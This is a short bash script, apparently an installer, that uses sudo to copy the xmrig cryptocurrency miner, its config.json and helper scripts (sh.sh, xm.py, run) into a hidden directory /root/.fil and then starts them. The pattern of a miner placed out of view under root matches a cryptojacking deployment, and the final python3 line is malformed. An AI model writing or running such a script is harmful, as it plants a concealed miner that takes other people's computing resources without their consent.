#!/bin/bash
sudo chmod +x *
bash test
mkdir /root/.fil
sudo cp run /root/.fil
sudo cp xmrig  /root/.fil && sudo cp config.json  /root/.fil && sudo cp SHA256SUMS  /root/.fil
sudo cp sh.sh /root/.fil
sudo cp xm.py /root/.fil
bash /root/.fil/run
python3 /root/.fil xm.py
